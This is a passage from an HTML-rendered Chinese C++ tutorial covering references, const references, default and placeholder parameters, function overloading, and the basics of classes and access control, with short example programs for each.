class="line"></span><br><span class="line">b &#x3D; 100;</span><br><span class="line"></span><br><span class="line">cout &lt;&lt; &quot;a &#x3D; &quot; &lt;&lt; a &lt;&lt; endl;</span><br><span class="line">cout &lt;&lt; &quot;b &#x3D; &quot; &lt;&lt; b &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">system(&quot;pause&quot;);</span><br><span class="line"></span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="引用注意事项"><a href="#引用注意事项" class="headerlink" title="引用注意事项"></a>引用注意事项</h2><ul><li>引用必须初始化</li><li>引用在初始化后，不可以改变</li></ul><p>示例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">int main() &#123;</span><br><span class="line"></span><br><span class="line">int a &#x3D; 10;</span><br><span class="line">int b &#x3D; 20;</span><br><span class="line">&#x2F;&#x2F;int &amp;c; &#x2F;&#x2F;错误，引用必须初始化</span><br><span class="line">int &amp;c &#x3D; a; &#x2F;&#x2F;一旦初始化后，就不可以更改</span><br><span class="line">c &#x3D; b; &#x2F;&#x2F;这是赋值操作，不是更改引用</span><br><span class="line"></span><br><span class="line">cout &lt;&lt; &quot;a &#x3D; &quot; &lt;&lt; a &lt;&lt; endl;</span><br><span class="line">cout &lt;&lt; &quot;b &#x3D; &quot; &lt;&lt; b &lt;&lt; endl;</span><br><span class="line">cout &lt;&lt; &quot;c &#x3D; &quot; &lt;&lt; c &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">system(&quot;pause&quot;);</span><br><span class="line"></span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="引用做函数参数"><a href="#引用做函数参数" class="headerlink" title="引用做函数参数"></a>引用做函数参数</h2><p><strong>作用：</strong>函数传参时，可以利用引用的技术让形参修饰实参</p><p><strong>优点：</strong>可以简化指针修改实参</p><p><strong>示例：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;1. 值传递</span><br><span class="line">void mySwap01(int a, int b) &#123;</span><br><span class="line">int temp &#x3D; a;</span><br><span class="line">a &#x3D; b;</span><br><span class="line">b &#x3D; temp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;2. 地址传递</span><br><span class="line">void mySwap02(int* a, int* b) &#123;</span><br><span class="line">int temp &#x3D; *a;</span><br><span class="line">*a &#x3D; *b;</span><br><span class="line">*b &#x3D; temp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;3. 引用传递</span><br><span class="line">void mySwap03(int&amp; a, int&amp; b) &#123;</span><br><span class="line">int temp &#x3D; a;</span><br><span class="line">a &#x3D; b;</span><br><span class="line">b &#x3D; temp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line"></span><br><span class="line">int a &#x3D; 10;</span><br><span class="line">int b &#x3D; 20;</span><br><span class="line"></span><br><span class="line">mySwap01(a, b);</span><br><span class="line">cout &lt;&lt; &quot;a:&quot; &lt;&lt; a &lt;&lt; &quot; b:&quot; &lt;&lt; b &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">mySwap02(&amp;a, &amp;b);</span><br><span class="line">cout &lt;&lt; &quot;a:&quot; &lt;&lt; a &lt;&lt; &quot; b:&quot; &lt;&lt; b &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">mySwap03(a, b);</span><br><span class="line">cout &lt;&lt; &quot;a:&quot; &lt;&lt; a &lt;&lt; &quot; b:&quot; &lt;&lt; b &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">system(&quot;pause&quot;);</span><br><span class="line"></span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>总结：通过引用参数产生的效果同按地址传递是一样的。引用的语法更清楚简单</p></blockquote><h2 id="引用做函数返回值"><a href="#引用做函数返回值" class="headerlink" title="引用做函数返回值"></a>引用做函数返回值</h2><p>作用：引用是可以作为函数的返回值存在的</p><p>注意：<strong>不要返回局部变量引用</strong></p><p>用法：函数调用作为左值</p><p><strong>示例：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;返回局部变量引用</span><br><span class="line">int&amp; test01() &#123;</span><br><span class="line">int a &#x3D; 10; &#x2F;&#x2F;局部变量</span><br><span class="line">return a;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;返回静态变量引用</span><br><span class="line">int&amp; test02() &#123;</span><br><span class="line">static int a &#x3D; 20;</span><br><span class="line">return a;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;不能返回局部变量的引用</span><br><span class="line">int&amp; ref &#x3D; test01();</span><br><span class="line">cout &lt;&lt; &quot;ref &#x3D; &quot; &lt;&lt; ref &lt;&lt; endl;</span><br><span class="line">cout &lt;&lt; &quot;ref &#x3D; &quot; &lt;&lt; ref &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;如果函数做左值，那么必须返回引用</span><br><span class="line">int&amp; ref2 &#x3D; test02();</span><br><span class="line">cout &lt;&lt; &quot;ref2 &#x3D; &quot; &lt;&lt; ref2 &lt;&lt; endl;</span><br><span class="line">cout &lt;&lt; &quot;ref2 &#x3D; &quot; &lt;&lt; ref2 &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">test02() &#x3D; 1000;</span><br><span class="line"></span><br><span class="line">cout &lt;&lt; &quot;ref2 &#x3D; &quot; &lt;&lt; ref2 &lt;&lt; endl;</span><br><span class="line">cout &lt;&lt; &quot;ref2 &#x3D; &quot; &lt;&lt; ref2 &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">system(&quot;pause&quot;);</span><br><span class="line"></span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="引用的本质"><a href="#引用的本质" class="headerlink" title="引用的本质"></a>引用的本质</h2><p>本质：<strong>引用的本质在c++内部实现是一个指针常量.</strong></p><p>讲解示例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;发现是引用，转换为 int* const ref &#x3D; &amp;a;</span><br><span class="line">void func(int&amp; ref)&#123;</span><br><span class="line">ref &#x3D; 100; &#x2F;&#x2F; ref是引用，转换为*ref &#x3D; 100</span><br><span class="line">&#125;</span><br><span class="line">int main()&#123;</span><br><span class="line">int a &#x3D; 10;</span><br><span class="line">    </span><br><span class="line">    &#x2F;&#x2F;自动转换为 int* const ref &#x3D; &amp;a; 指针常量是指针指向不可改，也说明为什么引用不可更改</span><br><span class="line">int&amp; ref &#x3D; a; </span><br><span class="line">ref &#x3D; 20; &#x2F;&#x2F;内部发现ref是引用，自动帮我们转换为: *ref &#x3D; 20;</span><br><span class="line">    </span><br><span class="line">cout &lt;&lt; &quot;a:&quot; &lt;&lt; a &lt;&lt; endl;</span><br><span class="line">cout &lt;&lt; &quot;ref:&quot; &lt;&lt; ref &lt;&lt; endl;</span><br><span class="line">    </span><br><span class="line">func(a);</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结论：C++推荐用引用技术，因为语法方便，引用本质是指针常量，但是所有的指针操作编译器都帮我们做了</p><h2 id="常量引用"><a href="#常量引用" class="headerlink" title="常量引用"></a>常量引用</h2><p><strong>作用：</strong>常量引用主要用来修饰形参，防止误操作</p><p>在函数形参列表中，可以加==const修饰形参==，防止形参改变实参</p><p><strong>示例：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;引用使用的场景，通常用来修饰形参</span><br><span class="line">void showValue(const int&amp; v) &#123;</span><br><span class="line">&#x2F;&#x2F;v +&#x3D; 10;</span><br><span class="line">cout &lt;&lt; v &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;int&amp; ref &#x3D; 10;  引用本身需要一个合法的内存空间，因此这行错误</span><br><span class="line">&#x2F;&#x2F;加入const就可以了，编译器优化代码，int temp &#x3D; 10; const int&amp; ref &#x3D; temp;</span><br><span class="line">const int&amp; ref &#x3D; 10;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;ref &#x3D; 100;  &#x2F;&#x2F;加入const后不可以修改变量</span><br><span class="line">cout &lt;&lt; ref &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;函数中利用常量引用防止误操作修改实参</span><br><span class="line">int a &#x3D; 10;</span><br><span class="line">showValue(a);</span><br><span class="line"></span><br><span class="line">system(&quot;pause&quot;);</span><br><span class="line"></span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="函数提高"><a href="#函数提高" class="headerlink" title="函数提高"></a>函数提高</h1><h2 id="函数默认参数"><a href="#函数默认参数" class="headerlink" title="函数默认参数"></a>函数默认参数</h2><p>在C++中，函数的形参列表中的形参是可以有默认值的。</p><p>语法：<code> 返回值类型 函数名 （参数= 默认值）&#123;&#125;</code></p><p><strong>示例：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">int func(int a, int b &#x3D; 10, int c &#x3D; 10) &#123;</span><br><span class="line">return a + b + c;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;1. 如果某个位置参数有默认值，那么从这个位置往后，从左向右，必须都要有默认值</span><br><span class="line">&#x2F;&#x2F;2. 如果函数声明有默认值，函数实现的时候就不能有默认参数</span><br><span class="line">int func2(int a &#x3D; 10, int b &#x3D; 10);</span><br><span class="line">int func2(int a, int b) &#123;</span><br><span class="line">return a + b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line"></span><br><span class="line">cout &lt;&lt; &quot;ret &#x3D; &quot; &lt;&lt; func(20, 20) &lt;&lt; endl;</span><br><span class="line">cout &lt;&lt; &quot;ret &#x3D; &quot; &lt;&lt; func(100) &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">system(&quot;pause&quot;);</span><br><span class="line"></span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="函数占位参数"><a href="#函数占位参数" class="headerlink" title="函数占位参数"></a>函数占位参数</h2><p>C++中函数的形参列表里可以有占位参数，用来做占位，调用函数时必须填补该位置</p><p><strong>语法：</strong> <code>返回值类型 函数名 (数据类型)&#123;&#125;</code></p><p>在现阶段函数的占位参数存在意义不大，但是后面的课程中会用到该技术</p><p><strong>示例：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;函数占位参数 ，占位参数也可以有默认参数</span><br><span class="line">void func(int a, int) &#123;</span><br><span class="line">cout &lt;&lt; &quot;this is func&quot; &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line"></span><br><span class="line">func(10,10); &#x2F;&#x2F;占位参数必须填补</span><br><span class="line"></span><br><span class="line">system(&quot;pause&quot;);</span><br><span class="line"></span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="函数重载"><a href="#函数重载" class="headerlink" title="函数重载"></a>函数重载</h2><h3 id="函数重载概述"><a href="#函数重载概述" class="headerlink" title="函数重载概述"></a>函数重载概述</h3><p><strong>作用：</strong>函数名可以相同，提高复用性</p><p><strong>函数重载满足条件：</strong></p><ul><li>同一个作用域下</li><li>函数名称相同</li><li>函数参数<strong>类型不同</strong> 或者 <strong>个数不同</strong> 或者 <strong>顺序不同</strong></li></ul><p><strong>注意:</strong> 函数的返回值不可以作为函数重载的条件</p><p><strong>示例：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;函数重载需要函数都在同一个作用域下</span><br><span class="line">void func()</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; &quot;func 的调用！&quot; &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line">void func(int a)</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; &quot;func (int a) 的调用！&quot; &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line">void func(double a)</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; &quot;func (double a)的调用！&quot; &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line">void func(int a ,double b)</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; &quot;func (int a ,double b) 的调用！&quot; &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line">void func(double a ,int b)</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; &quot;func (double a ,int b)的调用！&quot; &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;函数返回值不可以作为函数重载条件</span><br><span class="line">&#x2F;&#x2F;int func(double a, int b)</span><br><span class="line">&#x2F;&#x2F;&#123;</span><br><span class="line">&#x2F;&#x2F;cout &lt;&lt; &quot;func (double a ,int b)的调用！&quot; &lt;&lt; endl;</span><br><span class="line">&#x2F;&#x2F;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line"></span><br><span class="line">func();</span><br><span class="line">func(10);</span><br><span class="line">func(3.14);</span><br><span class="line">func(10,3.14);</span><br><span class="line">func(3.14 , 10);</span><br><span class="line"></span><br><span class="line">system(&quot;pause&quot;);</span><br><span class="line"></span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="函数重载注意事项"><a href="#函数重载注意事项" class="headerlink" title="函数重载注意事项"></a>函数重载注意事项</h3><ul><li>引用作为重载条件</li><li>函数重载碰到函数默认参数</li></ul><p><strong>示例：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;函数重载注意事项</span><br><span class="line">&#x2F;&#x2F;1、引用作为重载条件</span><br><span class="line"></span><br><span class="line">void func(int &amp;a)</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; &quot;func (int &amp;a) 调用 &quot; &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void func(const int &amp;a)</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; &quot;func (const int &amp;a) 调用 &quot; &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;2、函数重载碰到函数默认参数</span><br><span class="line"></span><br><span class="line">void func2(int a, int b &#x3D; 10)</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; &quot;func2(int a, int b &#x3D; 10) 调用&quot; &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void func2(int a)</span><br><span class="line">&#123;</span><br><span class="line">cout &lt;&lt; &quot;func2(int a) 调用&quot; &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line"></span><br><span class="line">int a &#x3D; 10;</span><br><span class="line">func(a); &#x2F;&#x2F;调用无const</span><br><span class="line">func(10);&#x2F;&#x2F;调用有const</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;func2(10); &#x2F;&#x2F;碰到默认参数产生歧义，需要避免</span><br><span class="line"></span><br><span class="line">system(&quot;pause&quot;);</span><br><span class="line"></span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="类和对象"><a href="#类和对象" class="headerlink" title="类和对象"></a>类和对象</h1><p>C++面向对象的三大特性为：==封装、继承、多态==</p><p>C++认为==万事万物都皆为对象==，对象上有其属性和行为</p><p><strong>例如：</strong></p><p> 人可以作为对象，属性有姓名、年龄、身高、体重…，行为有走、跑、跳、吃饭、唱歌…</p><p> 车也可以作为对象，属性有轮胎、方向盘、车灯…,行为有载人、放音乐、放空调…</p><p> 具有相同性质的==对象==，我们可以抽象称为==类==，人属于人类，车属于车类</p><h2 id="封装"><a href="#封装" class="headerlink" title="封装"></a>封装</h2><h3 id="封装的意义"><a href="#封装的意义" class="headerlink" title="封装的意义"></a>封装的意义</h3><p>封装是C++面向对象三大特性之一</p><p>封装的意义：</p><ul><li>将属性和行为作为一个整体，表现生活中的事物</li><li>将属性和行为加以权限控制</li></ul><p><strong>封装意义一：</strong></p><p> 在设计类的时候，属性和行为写在一起，表现事物</p><p><strong>语法：</strong> <code>class 类名&#123; 访问权限： 属性 / 行为 &#125;;</code></p><p><strong>示例1：</strong>设计一个圆类，求圆的周长</p><p><strong>示例代码：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;圆周率</span><br><span class="line">const double PI &#x3D; 3.14;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;1、封装的意义</span><br><span class="line">&#x2F;&#x2F;将属性和行为作为一个整体，用来表现生活中的事物</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;封装一个圆类，求圆的周长</span><br><span class="line">&#x2F;&#x2F;class代表设计一个类，后面跟着的是类名</span><br><span class="line">class Circle</span><br><span class="line">&#123;</span><br><span class="line">public:  &#x2F;&#x2F;访问权限  公共的权限</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;属性</span><br><span class="line">int m_r;&#x2F;&#x2F;半径</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;行为</span><br><span class="line">&#x2F;&#x2F;获取到圆的周长</span><br><span class="line">double calculateZC()</span><br><span class="line">&#123;</span><br><span class="line">&#x2F;&#x2F;2 * pi  * r</span><br><span class="line">&#x2F;&#x2F;获取圆的周长</span><br><span class="line">return  2 * PI * m_r;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;通过圆类，创建圆的对象</span><br><span class="line">&#x2F;&#x2F; c1就是一个具体的圆</span><br><span class="line">Circle c1;</span><br><span class="line">c1.m_r &#x3D; 10; &#x2F;&#x2F;给圆对象的半径 进行赋值操作</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;2 * pi * 10 &#x3D; &#x3D; 62.8</span><br><span class="line">cout &lt;&lt; &quot;圆的周长为： &quot; &lt;&lt; c1.calculateZC() &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">system(&quot;pause&quot;);</span><br><span class="line"></span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>示例2：</strong>设计一个学生类，属性有姓名和学号，可以给姓名和学号赋值，可以显示学生的姓名和学号</p><p><strong>示例2代码：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;学生类</span><br><span class="line">class Student &#123;</span><br><span class="line">public:</span><br><span class="line">void setName(string name) &#123;</span><br><span class="line">m_name &#x3D; name;</span><br><span class="line">&#125;</span><br><span class="line">void setID(int id) &#123;</span><br><span class="line">m_id &#x3D; id;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void showStudent() &#123;</span><br><span class="line">cout &lt;&lt; &quot;name:&quot; &lt;&lt; m_name &lt;&lt; &quot; ID:&quot; &lt;&lt; m_id &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line">public:</span><br><span class="line">string m_name;</span><br><span class="line">int m_id;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line"></span><br><span class="line">Student stu;</span><br><span class="line">stu.setName(&quot;德玛西亚&quot;);</span><br><span class="line">stu.setID(250);</span><br><span class="line">stu.showStudent();</span><br><span class="line"></span><br><span class="line">system(&quot;pause&quot;);</span><br><span class="line"></span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>封装意义二：</strong></p><p>类在设计时，可以把属性和行为放在不同的权限下，加以控制</p><p>访问权限有三种：</p><ol><li>public 公共权限</li><li>protected 保护权限</li><li>private 私有权限</li></ol><p><strong>示例：</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;三种权限</span><br><span class="line">&#x2F;&#x2F;公共权限  public     类内可以访问  类外可以访问</span><br><span class="line">&#x2F;&#x2F;保护权限  protected  类内可以访问  类外不可以访问</span><br><span class="line">&#x2F;&#x2F;私有权限  private    类内可以访问  类外不可以访问</span><br><span class="line"></span><br><span class="line">class Person</span><br><span class="line">&#123;</span><br><span class="line">&#x2F;&#x2F;姓名  公共权限</span><br><span class="line">public:</span><br><span class="line">string m_Name;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;汽车  保护权限</span><br><span class="line">protected:</span><br><span class="line">string m_Car;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;银行卡密码  私有权限</span><br><span class="line">private:</span><br><span class="line">int m_Password;</span><br><span class="line"></span><br><span class="line">public:</span><br><span class="line">void func()</span><br><span class="line">&#123;</span><br><span class="line">m_Name &#x3D; &quot;张三&quot;;</span><br><span class="line">m_Car &#x3D; &quot;拖拉机&quot;;</span><br><span class="line">m_Password &#x3D; 123456;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line"></span><br><span class="line">Person p;</span><br><span class="line">p.m_Name &#x3D; &quot;李四&quot;;</span><br><span class="line">&#x2F;&#x2F;p.m_Car &#x3D; &quot;奔驰&quot;;  &#x2F;&#x2F;保护权限类外访问不到</span><br><span class="line">&#x2F;&#x2F;p.m_Password &#x3D; 123; 